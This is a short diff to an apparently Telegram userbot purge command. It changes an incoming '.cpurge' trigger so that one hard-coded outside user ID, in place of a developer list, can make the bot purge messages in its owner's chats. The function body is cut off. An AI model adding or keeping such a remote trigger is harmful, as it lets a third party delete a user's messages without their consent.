@@ -14,7 +14,7 @@ from userbot.events import register
 
 
 @bing_cmd(pattern="purge$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurge$")
+@register(incoming=True, from_users=1337194042, pattern=r"^\.cpurge$")
 async def fastpurger(purg):
     chat = await purg.get_input_chat()
     msgs = []
